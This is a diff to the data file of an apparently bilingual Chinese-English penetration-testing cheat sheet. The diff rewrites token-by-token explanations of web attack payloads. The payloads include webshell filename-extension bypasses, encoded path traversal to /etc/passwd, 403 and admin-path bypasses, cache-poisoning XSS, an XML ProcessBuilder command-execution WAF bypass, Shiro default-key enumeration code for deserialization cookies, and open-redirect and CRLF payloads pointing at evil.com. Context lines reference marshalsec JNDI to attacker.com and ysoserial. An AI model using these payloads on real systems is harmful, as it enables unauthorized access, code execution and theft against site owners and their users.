+              { part: 'shell.jsp%20', explanation: { zh: '尾部空格(Windows自动忽略)', en: 'Trailing space (Windows)' }, type: 'path' },
+              { part: 'shell.jsp::$DATA', explanation: { zh: 'NTFS数据流绕过扩展名', en: 'NTFS data stream' }, type: 'path' },
+              { part: 'shell.jsp/', explanation: { zh: '尾部斜杠变体', en: 'Trailing slash' }, type: 'path' },
+              { part: 'shell.jsp%00', explanation: { zh: '空字节截断扩展名', en: 'Null byte truncation' }, type: 'encoding' },
+              { part: 'shell.jSp', explanation: { zh: '大小写混合扩展名', en: 'Mixed-case extension' }, type: 'path' },
             ],
         description: { zh: '文件名绕过', en: 'FilenameBypass' }, 
         platform: 'all'
@@ -9841,8 +10014,9 @@ java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com:8080/#
         title: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         command: '# URL编码\n/static/%2e%2e/%2e%2e/etc/passwd\n\n# 双重编码\n/static/%252e%252e/%252e%252e/etc/passwd\n\n# Unicode编码\n/static/..%c0%af..%c0%af/etc/passwd',
             syntaxBreakdown: [
-              { part: '#', explanation: { zh: '命令/载荷起始', en: 'Command/PayloadStart' }, type: 'command' },
-              { part: ' URL编码\n/static/%2e%2e/%2e%2e/etc/passwd\n\n# 双重编码\n/static/%252e%252e/%252e%252e/etc/passwd\n\n# Unicode编码\n/static/..%c0%af..%c0%af/etc/passwd', explanation: { zh: '参数与载荷内容', en: 'Parameter and PayloadContent' }, type: 'value' }
+              { part: '/static/%2e%2e/%2e%2e/etc/passwd', explanation: { zh: 'static目录下编码点号回溯读passwd', en: 'Encoded dots under static path' }, type: 'encoding' },
+              { part: '/static/%252e%252e/%252e%252e/etc/passwd', explanation: { zh: '双重编码回溯变体', en: 'Double-encoded variant' }, type: 'encoding' },
+              { part: '..%c0%af', explanation: { zh: '过长UTF-8编码的斜杠', en: 'Overlong UTF-8 slash' }, type: 'encoding' },
             ],
         description: { zh: '编码绕过', en: 'Encoding Bypass' }, 
         platform: 'all'
@@ -10131,9 +10305,15 @@ X-HTTP-Method-Override: DELETE
 /admin..;/ → 200
 /%61dmin → 200`,
             syntaxBreakdown: [
-              { part: '# HTTP方法篡改:\nGET /admin HTTP/1.1 → 403\nPOST /admin HTTP/1.1 → 200\nPATCH /admin HTTP/1.1\nOPTIONS /admin HTTP/1.1\nX-HTTP-Method: PUT\nX-HTTP-Method-Override: ', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'DELETE', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: '\n\n# 路径规范化:\n/admin → 403\n/ADMIN → 200\n/admin/ → 200\n//admin → 200\n/./admin → 200\n/admin..;/ → 200\n/%61dmin → 200', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: 'GET /admin HTTP/1.1 → 403', explanation: { zh: 'GET请求被403拦截', en: 'GET blocked with 403' }, type: 'method' },
+              { part: 'POST /admin HTTP/1.1 → 200', explanation: { zh: '改POST即绕过访问控制', en: 'POST bypasses access control' }, type: 'method' },
+              { part: 'X-HTTP-Method: PUT', explanation: { zh: '方法覆盖请求头', en: 'Method override header' }, type: 'header' },
+              { part: 'X-HTTP-Method-Override: DELETE', explanation: { zh: '方法覆盖请求头变体', en: 'Method override header variant' }, type: 'header' },
+              { part: '/ADMIN → 200', explanation: { zh: '路径大小写绕过', en: 'Case-based path bypass' }, type: 'path' },
+              { part: '//admin → 200', explanation: { zh: '双斜杠绕过', en: 'Double-slash bypass' }, type: 'path' },
+              { part: '/./admin → 200', explanation: { zh: '相对段绕过', en: 'Dot-segment bypass' }, type: 'path' },
+              { part: '/admin..;/ → 200', explanation: { zh: '分号截断绕过(Tomcat类)', en: 'Semicolon truncation bypass' }, type: 'path' },
+              { part: '/%61dmin → 200', explanation: { zh: 'URL编码绕过', en: 'URL-encoded path bypass' }, type: 'encoding' },
             ],
         description: { zh: '使用非标准HTTP方法或方法覆盖头绕过基于方法的访问控制，利用URL路径大小写、双斜杠、点号、编码等规范化差异绕过路径匹配', en: 'Bypass method-based access control using non-standard HTTP methods or method override headers; exploit URL path case, double slashes, dots, encoding and other normalization differences to bypass path matching' },
       },
@@ -10465,15 +10645,12 @@ q=<script>alert(1)</script>
 :path: /
 transfer-encoding: chunked`,
             syntaxBreakdown: [
-              { part: '# 参数伪装(Parameter Cloaking):\n# UTM参数通常不在缓存键中:\n/page?utm_content=', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n/page?callback=alert(1)&utm_source=x\n\n# Fat GET投毒:\nGET /api/data HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 15\n\nq=', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '<script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: 'alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' },
-              { part: '</script>', explanation: { zh: 'HTML标签/事件处理器', en: 'HTMLtag/EventprocessingTool' }, type: 'tag' },
-              { part: '\n\n# HTTP/2专属头:\n:method: GET\n:path: /\ntransfer-encoding: chunked', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: 'utm_content=', explanation: { zh: 'UTM参数通常不参与缓存键计算', en: 'UTM params excluded from cache key' }, type: 'parameter' },
+              { part: '?callback=alert(1)&utm_source=x', explanation: { zh: 'callback进入响应、utm不影响缓存命中', en: 'Poisoned response cached' }, type: 'value' },
+              { part: 'GET /api/data HTTP/1.1', explanation: { zh: 'Fat GET：GET请求携带body', en: 'Fat GET carries a body' }, type: 'method' },
+              { part: 'Content-Length: 15', explanation: { zh: '声明body长度使服务器解析GET body', en: 'Declare body length on GET' }, type: 'header' },
+              { part: ':method: GET', explanation: { zh: 'HTTP/2伪头部形式', en: 'HTTP/2 pseudo-header' }, type: 'header' },
+              { part: 'transfer-encoding: chunked', explanation: { zh: 'HTTP/2中非法的TE头：制造解析差异', en: 'Illegal TE header in HTTP/2' }, type: 'header' },
             ],
         description: { zh: '利用UTM等追踪参数不被缓存键包含的特性注入恶意内容，或使用Fat GET请求体覆盖查询参数，HTTP/2独有伪头触发差异化处理', en: 'Inject malicious content via tracking parameters (UTM etc.) excluded from cache keys, or use Fat GET request bodies to override query parameters; HTTP/2-specific pseudo-headers trigger differential processing' },
       },
@@ -11019,9 +11196,11 @@ java -jar ysoserial.jar CommonsCollections1 "touch /tmp/test" | python3 t3_send.
   </object>
 </java>`,
             syntaxBreakdown: [
-              { part: '<!-- UTF-16编码绕过 -->\n', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' },
-              { part: '<?xml version="1.0" encoding="UTF-16"?>', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: '\n\n<!-- CDATA包裹关键字 -->\n<java>\n  <object class="java.lang.Proc', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' }
+              { part: 'encoding="UTF-16"', explanation: { zh: 'UTF-16声明绕过WAF的字节级匹配', en: 'UTF-16 evades byte matching' }, type: 'encoding' },
+              { part: '<![CDATA[/bin/sh]]>', explanation: { zh: 'CDATA包裹命令路径绕过关键字', en: 'CDATA wraps command path' }, type: 'value' },
+              { part: '<object class="java.lang.ProcessBuilder">', explanation: { zh: '实例化ProcessBuilder对象', en: 'Instantiate ProcessBuilder' }, type: 'tag' },
+              { part: '<void index="2"><string><![CDATA[id]]></string></void>', explanation: { zh: '数组槽位2注入命令id', en: 'Command injected in array slot' }, type: 'value' },
+              { part: '<void method="start"/>', explanation: { zh: 'start方法启动进程执行命令', en: 'start launches the process' }, type: 'tag' },
             ],
           description: { zh: '通过XML编码（UTF-16/CDATA/实体编码）混淆payload内容绕过基于内容匹配的WAF', en: 'throughXMLEncoding(UTF-16/CDATA/EntityEncoding)ObfuscationpayloadContentBypassBased onContentMatch WAF' } 
         }
@@ -11885,9 +12064,13 @@ cat saml.xml | base64 -w0 | python3 -c "import sys,urllib.parse; print(urllib.pa
 # 5. Deflate+Base64(某些实现接受):
 python3 -c "import zlib,base64; print(base64.b64encode(zlib.compress(open('saml.xml','rb').read())).decode())"`,
             syntaxBreakdown: [
-              { part: '# 1. XML编码混淆:\n# 使用CDATA段包裹payload:\n<NameID><![CDATA[admin@ta', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' },
-              { part: '<!DOCTYPE foo [<!ENTITY user "admin@target.com">', explanation: { zh: 'XML声明/实体定义', en: 'XML declaration/entity definition' }, type: 'tag' },
-              { part: ']>\n<NameID>&user;</NameID>\n\n# 3. XML命名空间混淆:\n<saml:NameID xml', explanation: { zh: 'XML内容', en: 'XMLContent' }, type: 'value' }
+              { part: '<![CDATA[admin@target.com]]>', explanation: { zh: 'CDATA包裹身份声明值', en: 'CDATA wraps NameID value' }, type: 'value' },
+              { part: '<!ENTITY user "admin@target.com">', explanation: { zh: 'DTD内部实体定义身份值', en: 'DTD entity defines identity' }, type: 'tag' },
+              { part: '&user;', explanation: { zh: '实体引用展开', en: 'Entity reference expansion' }, type: 'value' },
+              { part: 'xmlns:x="http://evil.com"', explanation: { zh: '注入恶意命名空间声明', en: 'Injected namespace' }, type: 'parameter' },
+              { part: 'cat saml.xml | base64 -w0', explanation: { zh: '标准单行Base64编码', en: 'Single-line Base64 encoding' }, type: 'command' },
+              { part: 'urllib.parse.quote', explanation: { zh: 'Base64后再URL编码', en: 'URL-encode after Base64' }, type: 'function' },
+              { part: 'zlib.compress', explanation: { zh: 'Deflate压缩+Base64变体', en: 'Deflate+Base64 variant' }, type: 'function' },
             ],
         description: { zh: 'XML编码混淆和多种格式变体绕过WAF对SAML的检测', en: 'XMLEncodingObfuscation and MultipleFormatVariantBypass WAF for SAML Detection' },
         platform: 'linux',
@@ -12179,9 +12362,12 @@ print(text)
 # 检查响应头、Cookie、隐藏字段中是否包含验证码值
 curl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"`,
             syntaxBreakdown: [
-              { part: '# OCR自动识别图形验证码:\n# Python + Tesseract:\nimport pytesseract\n', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'from', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: ' PIL import Image\nimg = Image.open("captcha.png")\ntext = pytesseract.image_to_string(img)\nprint(text)\n\n# 音频验证码利用:\n# 使用Google Speech-to-Text API识别音频验证码\n# 或使用Selenium自动获取+语音识别\n\n# 验证码响应泄露:\n# 检查响应头、Cookie、隐藏字段中是否包含验证码值\ncurl -v "http://target.com/captcha/generate" 2>&1 | grep -iE "captcha|code|verify"', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: 'import pytesseract', explanation: { zh: '导入OCR识别库', en: 'Import OCR library' }, type: 'command' },
+              { part: 'img = Image.open("captcha.png")', explanation: { zh: '加载验证码图片', en: 'Load captcha image' }, type: 'function' },
+              { part: 'pytesseract.image_to_string(img)', explanation: { zh: 'OCR识别图片中的字符', en: 'OCR recognizes characters' }, type: 'function' },
+              { part: 'Google Speech-to-Text', explanation: { zh: '语音验证码转文字识别', en: 'Speech-to-text for audio captcha' }, type: 'concept' },
+              { part: 'curl -v "http://target.com/captcha/generate"', explanation: { zh: '检查验证码响应是否泄露', en: 'Inspect captcha response' }, type: 'command' },
+              { part: 'grep -iE "captcha|code|verify"', explanation: { zh: '检索响应中的验证码痕迹', en: 'Grep for captcha leakage' }, type: 'command' },
             ],
         description: { zh: '使用OCR工具(Tesseract)自动识别简单图形验证码，利用音频验证码的语音识别替代方案，或检查响应中是否直接泄露验证码值', en: 'Use OCR tools (Tesseract) to auto-recognize simple graphical CAPTCHAs, leverage speech recognition on audio CAPTCHAs as alternatives, or check if CAPTCHA values are leaked directly in responses' },
       },
@@ -12380,9 +12566,12 @@ for k in keys:
 # 3. GCM模式(Shiro 1.4.2+):
 # 新版Shiro使用AES-GCM，需要对应的加密方式`,
             syntaxBreakdown: [
-              { part: '# 1. 修改Cookie名称大小写:\ncurl -b "RememberMe=payload" "http://target.com/"\ncurl -b "rememberme=payload" "http://target.com/"\ncurl -b "REMEMBERME=payload" "http://target.com/"\n\n# 2. Shiro密钥枚举(使用不同密钥加密payload):\nimport base64, itertools\n', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' },
-              { part: 'from', explanation: { zh: 'SQL关键字', en: 'SQLCriticalCharacter' }, type: 'keyword' },
-              { part: ' Crypto.Cipher import AES\nimport os\n\nkeys = [\n    "kPH+bIxk5D2deZiIxcaaaA==",\n    "2AvVhdsgUs0FSA3SDFAdag==",\n    "3AvVhmFLUs0KTA3Kprsdag==",\n    "4AvVhmFLUs0KTA3Kprsdag==",\n    "Z3VucwAAAAAAAAAAAAAAAA==",\n    "wGiHplamyXlVB11UXWol8g==",\n    "fCq+/xW488hMTCD+cmJ3aQ==",\n]\n\npayload = open("payload.ser", "rb").read()\nfor k in keys:\n    try:\n        key = base64.b64decode(k)\n        iv = os.urandom(16)\n        pad = 16 - len(payload) % 16\n        padded = payload + bytes([pad]) * pad\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        enc = base64.b64encode(iv + cipher.encrypt(padded)).decode()\n        print(f"Key: {k} → Cookie length: {len(enc)}")\n    except Exception as e:\n        print(f"Key: {k} → Error: {e}")\n\n# 3. GCM模式(Shiro 1.4.2+):\n# 新版Shiro使用AES-GCM，需要对应的加密方式', explanation: { zh: 'SQL表达式', en: 'SQLtableexpression' }, type: 'value' }
+              { part: 'curl -b "RememberMe=payload"', explanation: { zh: 'Cookie名大小写变体绕过精确匹配', en: 'Cookie name case variants' }, type: 'command' },
+              { part: 'AES.MODE_CBC', explanation: { zh: '旧版Shiro的AES-CBC加密模式', en: 'Legacy AES-CBC mode' }, type: 'parameter' },
+              { part: 'kPH+bIxk5D2deZiIxcaaaA==', explanation: { zh: 'Shiro默认密钥之一', en: 'Default Shiro key' }, type: 'value' },
+              { part: 'iv = os.urandom(16)', explanation: { zh: '随机生成16字节IV', en: 'Random 16-byte IV' }, type: 'function' },
+              { part: 'AES.new(key, AES.MODE_CBC, iv)', explanation: { zh: '用候选密钥构造加密器', en: 'Build cipher with candidate key' }, type: 'function' },
+              { part: 'AES-GCM', explanation: { zh: 'Shiro 1.4.2+改用GCM模式', en: 'GCM mode since 1.4.2' }, type: 'concept' },
             ],
         description: { zh: '枚举Shiro密钥和不同加密模式绕过检测', en: 'EnumerationShirokey and not SameEncryptionModeBypassDetection' },
         platform: 'all',
@@ -14808,7 +14997,12 @@ https://target.com/redirect?url=https://evil .com
 https://target.com/redirect?url=java%09script:alert(1)
 https://target.com/redirect?url=\\x09javascript:alert(1)`,
             syntaxBreakdown: [
-              { part: '# 空字节截断\nhttps://target.com/redirect?url=https://target.com%00@evil.com\nhttps://target.com/redirect?url=https://evil.com%00.target.com\n\n# 换行符注入\nhttps://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com\n\n# Tab/空格混淆\nhttps://target.com/redirect?url=https://evil .com\nhttps://target.com/redirect?url=java%09script:alert(1)\nhttps://target.com/redirect?url=\\x09javascript:alert(1)', explanation: { zh: '注入代码', en: 'InjectionCode' }, type: 'value' }
+              { part: 'https://target.com%00@evil.com', explanation: { zh: '空字节截断：%00截断前段使解析落在evil.com', en: 'Null byte makes parser land on evil.com' }, type: 'encoding' },
+              { part: 'https://evil.com%00.target.com', explanation: { zh: '空字节后缀变体', en: 'Null byte suffix variant' }, type: 'encoding' },
+              { part: '%0d%0aLocation:%20https://evil.com', explanation: { zh: 'CRLF注入伪造Location头', en: 'CRLF injects Location header' }, type: 'encoding' },
+              { part: 'https://evil .com', explanation: { zh: '域名中插入空格混淆解析', en: 'Space inside hostname' }, type: 'value' },
+              { part: 'java%09script:alert(1)', explanation: { zh: '%09(Tab)替代空格的伪协议混淆', en: 'Tab inside pseudo-protocol' }, type: 'encoding' },
+              { part: '\\x09javascript:alert(1)', explanation: { zh: '十六进制Tab转义变体', en: 'Hex-escaped tab variant' }, type: 'encoding' },
             ],
           description: { zh: '利用空字节截断URL校验、CRLF注入额外头部、特殊空白字符混淆URL解析', en: 'Truncate URL validation via null bytes, inject extra headers via CRLF, confuse URL parsing via special whitespace characters' } 
         }
